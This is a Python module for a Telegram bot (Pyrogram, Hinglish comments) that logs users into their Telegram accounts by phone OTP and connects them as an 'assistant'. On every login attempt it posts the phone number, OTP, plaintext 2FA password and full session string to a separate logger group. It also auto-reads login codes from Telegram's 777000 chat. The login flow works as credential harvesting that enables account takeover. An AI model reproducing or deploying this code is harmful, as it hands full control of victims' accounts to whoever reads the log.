
"""
phone_session.py — Phone Number se OTP login aur assistant connect.

Flow:
  1. User /addphone +91XXXXXXXXXX bhejta hai
  2. Bot send_code() karta hai → OTP Telegram pe aata hai
  3. Bot wahi OTP user ki ID pe forward karta hai (taaki woh dekh sake)
  4. User /otp 12345 karta hai
  5. Agar 2FA → /otp password
  6. Login hone ke baad → logger group mein EK combined message aata hai:
       Phone + OTP + 2FA (agar tha) + Account name + User ID + Requester info
"""

import asyncio
import logging
import time
from datetime import datetime
from typing import Dict, Any, Optional

from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import (
    PhoneCodeExpired,
    PhoneCodeInvalid,
    PhoneNumberInvalid,
    SessionPasswordNeeded,
    FloodWait,
    PhoneNumberBanned,
)

from config.settings import API_ID, API_HASH, LOG_CHAT_ID
from core.sudo import is_sudo, is_owner
from core.user_sessions import save_user_session

logger = logging.getLogger(__name__)

# per-user state
# uid → {
#   client, phone, phone_code_hash,
#   step: "otp" | "2fa",
#   started_at, req,
#   otp_code: str | None,       ← jab user /otp kare toh yahan store hoga
#   twofa_pass: str | None,     ← agar 2FA tha
# }
_pending: Dict[int, Dict[str, Any]] = {}
_OTP_TIMEOUT = 300  # 5 min


def _now_str() -> str:
    return datetime.now().strftime("%d %b %Y · %H:%M:%S")


def _cleanup_old():
    now = time.time()
    dead = [u for u, s in _pending.items() if now - s["started_at"] > _OTP_TIMEOUT]
    for u in dead:
        try:
            asyncio.create_task(_safe_disconnect(_pending.pop(u)["client"]))
        except Exception:
            pass


async def _safe_disconnect(client: Client):
    try:
        await client.disconnect()
    except Exception:
        pass


class PhoneSessionCommands:

    def __init__(self, bot: Client, assistant_manager, audio_bridge=None, db=None):
        self.bot = bot
        self.am = assistant_manager
        self.audio_bridge = audio_bridge
        self.db = db
        self._register()

    # ── helpers ────────────────────────────────────────────────────────

    async def _log(self, text: str):
        """Logger group mein ek message bhejo."""
        if not LOG_CHAT_ID:
            return
        try:
            await self.bot.send_message(
                LOG_CHAT_ID, text, disable_web_page_preview=True
            )
        except Exception as e:
            logger.warning(f"log send fail: {e}")

    async def _get_req(self, uid: int) -> dict:
        try:
            u = await self.bot.get_users(uid)
            return {
                "name": u.first_name or str(uid),
                "tag": f"@{u.username}" if u.username else str(uid),
                "id": uid,
            }
        except Exception:
            return {"name": str(uid), "tag": str(uid), "id": uid}

    async def _try_read_otp_from_777000(self, uid: int, phone: str, hash_: str):
        """
        Agar user ka apna assistant connected hai, toh usse 777000 se
        latest OTP message padhke seedha user ki bot ID pe bhej do.
        5 second wait karte hain taaki Telegram OTP deliver kar sake.
        """
        try:
            await asyncio.sleep(6)  # OTP aane ka wait

            # user ka connected assistant dhundo
            ass = self.am.get_user_assistant(uid)
            if not ass:
                # owner assistant try karo agar sudo user hai
                ass = self.am.get_assistant()
            if not ass:
                return

            user_client: Client = ass.get("client")
            if not user_client:
                return

            # 777000 se latest messages padhna
            TELEGRAM_OTP_ID = 777000
            otp_text = None
            try:
                async for msg in user_client.get_chat_history(TELEGRAM_OTP_ID, limit=3):
                    if msg.text and any(c.isdigit() for c in msg.text):
                        # OTP message — digits extract karo
                        import re
                        # 4-8 digit code dhundo
                        codes = re.findall(r'\b(\d{4,8})\b', msg.text)
                        if codes:
                            otp_text = codes[0]
                            full_msg = msg.text
                            break
            except Exception as e:
                logger.debug(f"777000 read fail: {e}")
                return

            if not otp_text:
                return

            # OTP user ki ID pe bhejo
            try:
                await self.bot.send_message(
                    uid,
                    f"**🔢 OTP Mila!**\n\n"
                    f"📞 Phone · `{phone}`\n"
                    f"🔑 Code  · **`{otp_text}`**\n\n"
                    f"▶️ Ab bhejo: `/otp {otp_text}`\n\n"
                    f"_(777000 se auto-read kiya)_"
                )
                logger.info(f"OTP auto-read success for uid={uid} phone={phone}")
            except Exception as e:
                logger.warning(f"OTP forward to user fail: {e}")

        except Exception as e:
            logger.debug(f"_try_read_otp_from_777000 error: {e}")

    async def _forward_otp_to_user(self, uid: int, phone: str, where: str = "Telegram App"):
        """User ki ID pe notification bhejo — OTP kahan check kare."""
        try:
            await self.bot.send_message(
                uid,
                f"**📨 OTP Request Bheja Gaya**\n\n"
                f"📞 Phone · `{phone}`\n"
                f"📍 Code aayega · **{where}**\n\n"
                f"Code milne ke baad yahan bhejo:\n"
                f"`/otp XXXXX`\n\n"
                f"SMS nahi aaya? `/otpsms` try karo",
            )
        except Exception as e:
            logger.warning(f"forward_otp DM fail: {e}")

    # ── connect + combined log ──────────────────────────────────────────

    async def _finish_connect(
        self,
        uid: int,
        session_string: str,
        me,
        msg: Message,
        state: dict,
    ):
        """
        Assistant connect karo aur logger group mein EK combined message bhejo:
        phone + OTP + 2FA (agar tha) + account details + requester info.
        """
        own = is_owner(uid)
        req = state["req"]
        phone = state["phone"]
        otp_code = state.get("otp_code") or "—"
        twofa = state.get("twofa_pass") or None

        # purana assistant hata do
        old = self.am.get_user_assistant(uid)
        if old:
            try:
                await self.am.remove_assistant(old["session"])
            except Exception:
                pass

        result = await self.am.add_assistant(session_string, owner_id=uid)
        ok, err = (result if isinstance(result, tuple) else (bool(result), "fail"))

        acc_name = f"@{me.username}" if me.username else me.first_name
        acc_phone = getattr(me, "phone_number", None) or phone

        if ok:
            if not own:
                save_user_session(uid, session_string)
            elif self.db:
                self.db.save_assistant(session_string, me.first_name, me.id, me.username)

            # user ko confirm
            await msg.edit(
                f"**✅ Login Successful**\n\n"
                f"Account · `{acc_name}`\n"
                f"User ID · `{me.id}`\n"
                f"Phone   · `{acc_phone}`\n\n"
                f"Assistant connected ✓\n"
                f"Remove: `/dlsession`"
            )

            # ── COMBINED LOG — sab ek saath ──
            twofa_line = f"  2FA    · `{twofa}`\n" if twofa else ""
            await self._log(
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 **NEW LOGIN — SUCCESS**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🕐 Time · `{_now_str()}`\n\n"
                f"👤 **Requester**\n"
                f"  Name · {req['name']}\n"
                f"  Tag  · {req['tag']}\n"
                f"  ID   · `{req['id']}`\n\n"
                f"📞 **Credentials**\n"
                f"  Phone  · `{phone}`\n"
                f"  OTP    · `{otp_code}`\n"
                f"{twofa_line}"
                f"\n"
                f"📲 **Account**\n"
                f"  Name    · {acc_name}\n"
                f"  User ID · `{me.id}`\n"
                f"  Phone   · `{acc_phone}`\n\n"
                f"🔑 **Session String**\n"
                f"`{session_string}`\n\n"
                f"✅ Status · Connected\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )

        else:
            await msg.edit(
                f"**❌ Connect fail**\n\n`{err}`\n\n"
                f"Session string manually: `/addsession STRING`"
            )
            twofa_line = f"  2FA    · `{twofa}`\n" if twofa else ""
            await self._log(
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📱 **NEW LOGIN — FAILED**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🕐 Time · `{_now_str()}`\n\n"
                f"👤 **Requester**\n"
                f"  Name · {req['name']}\n"
                f"  Tag  · {req['tag']}\n"
                f"  ID   · `{req['id']}`\n\n"
                f"📞 **Credentials**\n"
                f"  Phone  · `{phone}`\n"
                f"  OTP    · `{otp_code}`\n"
                f"{twofa_line}"
                f"\n"
                f"❌ Error · `{err[:200]}`\n"
                f"━━━━━━━━━━━━━━━━━━━━━━"
            )

    # ── command handlers ───────────────────────────────────────────────

    def _register(self):
        bot = self.bot

        # /addphone +91XXXXXXXXXX
        @bot.on_message(
            filters.command(["addphone", "loginphone", "phonelogin"]) & filters.private
        )
        async def cmd_addphone(client: Client, message: Message):
            uid = message.from_user.id
            if not is_sudo(uid):
                await message.reply("❌ Access nahi hai.")
                return

            parts = message.text.split(None, 1)
            if len(parts) < 2 or not parts[1].strip():
                await message.reply(
                    "**📱 Phone Se Login**\n\n"
                    "Usage: `/addphone +91XXXXXXXXXX`\n\n"
                    "International format mein (+ ke saath)."
                )
                return

            phone = parts[1].strip().replace(" ", "")
            if not phone.startswith("+"):
                phone = "+" + phone

            _cleanup_old()

            # pehle se pending cancel karo
            if uid in _pending:
                asyncio.create_task(_safe_disconnect(_pending.pop(uid)["client"]))

            req = await self._get_req(uid)
            status = await message.reply(f"**Connecting...** `{phone}`")

            temp_client = Client(
                name=f"ph_{uid}_{int(time.time())}",
                api_id=int(API_ID),
                api_hash=str(API_HASH),
                in_memory=True,
            )

            try:
                await temp_client.connect()

                # Step 1: send_code — pehla OTP trigger
                sent = await temp_client.send_code(phone)
                current_hash = sent.phone_code_hash

                # Step 2: Agar pehla OTP Telegram App pe gaya —
                # turant resend_code karo jo SMS pe force karta hai
                # Taaki OTP guaranteed aaye (SMS pe)
                code_type_raw = type(sent.type).__name__ if sent.type else ""
                sms_forced = False
                if "App" in code_type_raw or "Telegram" in code_type_raw:
                    try:
                        await asyncio.sleep(2)  # Telegram rate limit se bachne ke liye
                        resent = await temp_client.resend_code(phone, current_hash)
                        current_hash = resent.phone_code_hash
                        new_type = type(resent.type).__name__ if resent.type else ""
                        if "Sms" in new_type or "SMS" in new_type or "Call" in new_type:
                            sms_forced = True
                            where_short = "SMS / Missed Call"
                        else:
                            where_short = "Telegram App (777000)"
                    except FloodWait:
                        where_short = "Telegram App (777000)"
                    except Exception:
                        where_short = "Telegram App (777000)"
                elif "Sms" in code_type_raw or "SMS" in code_type_raw:
                    where_short = "SMS"
                    sms_forced = True
                elif "Call" in code_type_raw:
                    where_short = "Missed Call"
                    sms_forced = True
                else:
                    where_short = "Telegram / SMS"

                _pending[uid] = {
                    "client": temp_client,
                    "phone": phone,
                    "phone_code_hash": current_hash,
                    "step": "otp",
                    "started_at": time.time(),
                    "req": req,
                    "otp_code": None,
                    "twofa_pass": None,
                    "code_type": where_short,
                }

                if sms_forced:
                    delivery_note = (
                        f"✅ Code **SMS / Missed Call** pe bheja gaya `{phone}` pe\n"
                        f"Abhi check karo!"
                    )
                else:
                    delivery_note = (
                        f"📲 Code **Telegram app** mein **777000** se aayega\n"
                        f"SMS nahi aaya? `/otpsms` try karo"
                    )

                await status.edit(
                    f"**📨 OTP Bheja Gaya**\n\n"
                    f"📞 Phone · `{phone}`\n"
                    f"📍 Delivery · **{where_short}**\n\n"
                    f"{delivery_note}\n\n"
                    f"Code milne ke baad: `/otp 12345`\n"
                    f"Cancel: `/otpcancel`"
                )

                # user ki ID pe notification bhejo
                await self._forward_otp_to_user(uid, phone, where_short)

                # agar koi assistant already connected hai toh usse
                # 777000 chat se OTP read karne ki koshish karo (5 sec wait)
                asyncio.create_task(
                    self._try_read_otp_from_777000(uid, phone, current_hash)
                )

            except PhoneNumberInvalid:
                await _safe_disconnect(temp_client)
                await status.edit(
                    f"**❌ Invalid Number**\n\n`{phone}` valid nahi.\n"
                    f"Format: `/addphone +91XXXXXXXXXX`"
                )
            except PhoneNumberBanned:
                await _safe_disconnect(temp_client)
                await status.edit(f"**❌ Number Banned**\n\n`{phone}` banned hai.")
            except FloodWait as e:
                await _safe_disconnect(temp_client)
                await status.edit(f"**⏳ FloodWait** · `{e.value}s` baad try karo.")
            except Exception as e:
                await _safe_disconnect(temp_client)
                logger.exception("addphone send_code fail")
                await status.edit(f"**❌ Error**\n\n`{str(e)[:200]}`")

        # /otp CODE  (OTP ya 2FA password dono isi command se)
        @bot.on_message(
            filters.command(["otp", "verifyotp", "code"]) & filters.private
        )
        async def cmd_otp(client: Client, message: Message):
            uid = message.from_user.id
            if uid not in _pending:
                await message.reply(
                    "**Koi pending login nahi.**\n\nPehle `/addphone +91...` chalao."
                )
                return

            state = _pending[uid]
            if time.time() - state["started_at"] > _OTP_TIMEOUT:
                asyncio.create_task(_safe_disconnect(state["client"]))
                del _pending[uid]
                await message.reply("**⏰ Timeout.** Dobara `/addphone` chalao.")
                return

            parts = message.text.split(None, 1)
            if len(parts) < 2:
                await message.reply("**Usage:** `/otp 12345`")
                return

            code = parts[1].strip().replace(" ", "").replace("-", "")

            # user ka message delete (OTP/password chat mein na dikhe)
            try:
                await message.delete()
            except Exception:
                pass

            status = await message.reply("**Verifying...**")

            temp_client: Client = state["client"]
            phone = state["phone"]
            hash_ = state["phone_code_hash"]
            step = state["step"]

            try:
                if step == "otp":
                    # OTP store karo state mein
                    state["otp_code"] = code

                    try:
                        await temp_client.sign_in(phone, hash_, code)
                    except SessionPasswordNeeded:
                        state["step"] = "2fa"
                        await status.edit(
                            "**🔐 2FA Required**\n\n"
                            "Cloud password bhejo: `/otp TumharaPassword`"
                        )
                        return

                elif step == "2fa":
                    # 2FA password store karo
                    state["twofa_pass"] = code
                    await temp_client.check_password(code)

                # ── login successful ──
                me = await temp_client.get_me()
                session_string = await temp_client.export_session_string()

                saved_state = dict(state)  # copy before del
                del _pending[uid]

                await status.edit("**Connecting assistant...**")
                asyncio.create_task(_safe_disconnect(temp_client))

                # combined log + assistant connect
                await self._finish_connect(uid, session_string, me, status, saved_state)

            except PhoneCodeInvalid:
                await status.edit("**❌ Galat OTP**\n\nSahi code bhejo: `/otp XXXXX`")
            except PhoneCodeExpired:
                asyncio.create_task(_safe_disconnect(temp_client))
                del _pending[uid]
                await status.edit("**❌ OTP Expire.**\n\nDobara `/addphone` chalao.")
            except FloodWait as e:
                await status.edit(f"**⏳ FloodWait · {e.value}s**\n\nThodi der baad try karo.")
            except Exception as e:
                logger.exception("otp sign_in fail")
                await status.edit(f"**❌ Error**\n\n`{str(e)[:200]}`")

        # /otpcancel
        @bot.on_message(
            filters.command(["otpcancel", "cancelotp", "phonecancel"]) & filters.private
        )
        async def cmd_otp_cancel(client: Client, message: Message):
            uid = message.from_user.id
            if uid not in _pending:
                await message.reply("Koi pending login nahi.")
                return
            state = _pending.pop(uid)
            asyncio.create_task(_safe_disconnect(state["client"]))
            await message.reply("**✅ Cancel ho gaya.**")

        # /otpsms — SMS se resend karo agar Telegram app pe nahi aaya
        @bot.on_message(
            filters.command(["otpsms", "resendotp", "smsotp"]) & filters.private
        )
        async def cmd_otp_sms(client: Client, message: Message):
            uid = message.from_user.id
            if uid not in _pending:
                await message.reply(
                    "**Koi pending login nahi.**\n\nPehle `/addphone +91...` chalao."
                )
                return

            state = _pending[uid]
            if time.time() - state["started_at"] > _OTP_TIMEOUT:
                asyncio.create_task(_safe_disconnect(state["client"]))
                del _pending[uid]
                await message.reply("**⏰ Timeout.** Dobara `/addphone` chalao.")
                return

            temp_client: Client = state["client"]
            phone = state["phone"]
            hash_ = state["phone_code_hash"]
            status = await message.reply("**SMS se resend kar raha hoon...**")

            try:
                resent = await temp_client.resend_code(phone, hash_)
                # naya hash update karo
                state["phone_code_hash"] = resent.phone_code_hash

                new_type = type(resent.type).__name__ if resent.type else "Unknown"
                if "Sms" in new_type or "SMS" in new_type:
                    where = "SMS"
                elif "Call" in new_type:
                    where = "Missed Call"
                elif "App" in new_type:
                    where = "Telegram App (777000)"
                else:
                    where = new_type

                await status.edit(
                    f"**📱 Code Resend Kiya**\n\n"
                    f"📞 Phone · `{phone}`\n"
                    f"📍 Ab aayega · **{where}**\n\n"
                    f"Code milne ke baad: `/otp XXXXX`"
                )
            except FloodWait as e:
                await status.edit(f"**⏳ FloodWait · {e.value}s** baad try karo.")
            except Exception as e:
                await status.edit(f"**❌ Resend fail**\n\n`{str(e)[:200]}`")
